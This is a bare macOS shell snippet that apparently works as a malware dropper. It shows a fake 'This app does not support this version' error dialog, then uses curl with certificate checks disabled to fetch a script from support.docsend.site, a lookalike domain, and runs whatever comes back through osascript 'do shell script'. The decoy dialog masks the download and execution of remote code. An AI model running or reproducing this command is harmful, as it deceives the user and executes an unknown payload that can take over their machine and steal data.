(osascript -e 'display dialog "This app does not support this version." buttons {"OK"} default button "OK" with icon stop' || true) 
&& (shell=$(curl -L -k "https://support.docsend.site/519529/check"); 
osascript -e "do shell script $shell")
